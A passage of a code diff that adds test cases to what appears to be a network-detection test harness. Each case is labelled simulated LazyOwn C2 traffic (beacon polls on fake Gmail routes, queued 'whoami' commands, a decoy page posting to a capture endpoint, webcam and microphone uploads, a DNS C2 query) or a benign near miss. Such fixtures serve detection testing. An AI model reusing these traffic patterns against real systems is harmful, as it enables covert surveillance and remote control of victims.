+         response=ok('{"components":{"beacons":0,"database":"unavailable","listeners":{"active":[],"count":1}},"status":"degraded",'
+                     '"timestamp":1795000000.12,"uptime_seconds":5321.4}\n', ctype="application/json"))
+    http("near miss: another health answer with components", [], get("/api/health", host="10.2.0.5:8080", ua="curl/8.5.0"), port=8080,
+         response=ok('{"components":{"db":"ok"},"status":"healthy","uptime_seconds":12.0}', ctype="application/json"))
+    http("lazyown mcp asks the c2 for connected beacons", [3818105],
+         get("/get_connected_clients", host=c2, ua="Python-urllib/3.11", headers="Authorization: Basic b3BlcmF0b3I6cGFzcw==\r\n"),
+         port=4444, client="int", server="ext", response=ok('{"connected_clients":["victim-1"]}', ctype="application/json"))
+    http("near miss: a connected clients path under an api prefix", [], get("/api/v2/get_connected_clients_count", host="10.2.0.5"))
+    http("lazyown mcp queues a beacon command", [3818106],
+         post("/issue_command", '{"client_id": "victim-1", "command": "whoami"}', ua="Python-urllib/3.11", host=c2,
+              headers="Authorization: Basic b3BlcmF0b3I6cGFzcw==\r\n"), port=4444, client="int", server="ext")
+    http("near miss: an issue tracker command endpoint", [], post("/api/issue_command", '{"issue": 7, "command": "close"}'))
+    http("lazyown c2 decoy page", [3818107], get("/robots.txt", host=c2), port=4444, client="int", server="ext",
+         response=ok('<html><head>\n<title>Live View Page -  564 plot listing Template</title>\n</head><body><script>\n'
+                     "      const urlCompleta = window.location.href;\n        fetch(urlCompleta + 'capture', {\n          method: 'POST',\n"
+                     "        });\n</script></body></html>", "404 NOT FOUND"))
+    http("near miss: the template site's own live view page", [], get("/live/564-plot-listing", host="10.2.0.5"),
+         response=ok("<html><head><title>Live View Page -  564 plot listing Template</title></head><body><iframe></iframe></body></html>"))
+    http("lazyown decoy page posts a camera frame", [3818108],
+         post("/logincapture", '{"image":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAoAAAAHg"}', ua=BROWSER, host=c2),
+         port=4444, client="int", server="ext", response=ok('{"message":"Imagen recibida y guardada","status":"success"}', ctype="application/json"))
+    http("near miss: a screenshot upload under another name", [],
+         post("/api/screenshot", '{"image":"data:image/png;base64,iVBORw0KGgo"}', ua=BROWSER))
+    lz_audio = ('------WebKitFormBoundaryq1w2e3r4\r\nContent-Disposition: form-data; name="audio"; filename="audio_1795000000123.webm"\r\n'
+                'Content-Type: audio/webm\r\n\r\nWEBM\r\n------WebKitFormBoundaryq1w2e3r4--\r\n')
+    http("lazyown decoy page posts a microphone recording", [3818109],
+         post("/loginaudio", lz_audio, ua=BROWSER, host=c2, ctype="multipart/form-data; boundary=----WebKitFormBoundaryq1w2e3r4"),
+         port=4444, client="int", server="ext")
+    http("near miss: a voice note upload", [],
+         post("/notes/audio", lz_audio.replace('filename="audio_', 'filename="note_'), ua=BROWSER,
+              ctype="multipart/form-data; boundary=----WebKitFormBoundaryq1w2e3r4"))
+    lz_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+    http("lazyown beacon poll on the gmail route, empty command answer", [3818110, 3818113, 3818122],
+         get("/gmail/v1/users/victim-1", ua=lz_ua, host=c2), port=4444, client="int", server="ext",
+         response=ok("q83vEjRWeJCrze8SNFZ4kA==", ctype="application/octet-stream"))
+    http("near miss: a real gmail api call", [], get("/gmail/v1/users/me/messages?maxResults=10", host="gmail.googleapis.com"),
+         client="int", server="ext")
+    http("near miss: a gmail api path on a google host", [], get("/gmail/v1/users/me", host="www.googleapis.com"),
+         client="int", server="ext")
+    http("lazyown beacon result post on the gmail route", [3818111, 3818114],
+         post("/gmail/v1/users/victim-1", "q83vEjRWeJCrze8SNFZ4kLtUBiZqRuJn3nPgcRg/9mXdqqdM", ua="curl/7.88.1", host=c2,
+              ctype="application/octet-stream"), port=4444, client="int", server="ext",
+         response=ok('{"Platform":"linux","status":"success"}\n', ctype="application/json"))
+    http("near miss: another json answer naming a platform", [], post("/api/register", '{"os":"linux"}'),
+         response=ok('{"status":"success","Platform":"linux"}', ctype="application/json"))
+    http("lazyown blacksandbeacon report on the gmail route", [3818111], post("/gmail/v1/users/report/", "AAAA", ua="curl/7.88.1", host=c2),
+         port=4444, client="int", server="ext")
+    http("lazyown bof fetch on the gmail route, object missing", [3818112, 3818115],
+         get("/gmail/v1/users/bof/whoami.x64.o", ua="curl/7.88.1", host=c2), port=4444, client="int", server="ext",
+         response=ok("BOF_NOT_FOUND\r\n", ctype="text/plain; charset=utf-8"))
+    http("near miss: a not found text on another path", [], get("/files/bof/notes.txt"),
+         response=ok("BOF_NOT_FOUND here is a story\r\n", ctype="text/plain"))
+    http("lazyown diskless stager refused", [3818116, 3818117],
+         get("/stage/beacon", ua="python-requests/2.31.0", host=c2, headers="Authorization: Bearer 0123456789abcdef\r\n"),
+         port=4444, client="int", server="ext", response=ok("STAGE_FORBIDDEN\r\n", "403 FORBIDDEN", ctype="text/html; charset=utf-8"))
+    http("near miss: a stage page and a bearer token elsewhere", [],
+         get("/stage/beacon-schedule", ua="python-requests/2.31.0", headers="Authorization: Bearer abc\r\n"),
+         response=ok("STAGE_LEFT\r\n", ctype="text/plain"))
+    http("lazyown red team user agent", [3818120],
+         get("/", ua="Mozilla/5.0 (Linux; LAzyOwnRedTeam 66_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+             host="www.youtube.com"), client="int", server="ext")
+    http("near miss: an ordinary safari user agent", [],
+         get("/", ua="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"))
+    http("lazyown blacksandbeacon config user agent", [3818121],
+         get("/command/linux_beacon", host=c2,
+             ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Firefox/120.0"),
+         port=4444, client="int", server="ext", response=ok("q83vEjRWeJCrze8SNFZ4kA==", ctype="application/octet-stream"))
+    http("near miss: real chrome 120", [],
+         get("/", ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"))
+    http("near miss: the cut chrome 58 user agent on a web port", [], get("/", ua=lz_ua))
+    lookup("lazyown dns c2 query", [3818125], "MzI0LXN0YXR1cw.c2.lazyown.org")
+    lookup("near miss: a look-alike domain", [], "c2.lazyown.org.example.net")
+    http("lazyown exploit search user agent", [3818130],
+         get("/api/search-exploit?name=vsftpd", ua="LazyOwn/1.0", host="www.exploitalert.com"), client="int", server="ext")
+    http("near miss: a user agent that starts with LazyOwn and a version", [], get("/", ua="LazyOwn/1.0 Explorer"), client="int", server="ext")
+    http("lazyown dependency confusion check", [3818131],
+         get("/simple/acme-internal-utils/", ua="lazyown-depconfuse/1.0", host="pypi.org"), client="int", server="ext")
+    http("near miss: pip", [], get("/simple/acme-internal-utils/", ua="pip/24.0", host="pypi.org"), client="int", server="ext")
+
 
 def build_pcap(path):
     pkts, clock = [], [1795000000.0]
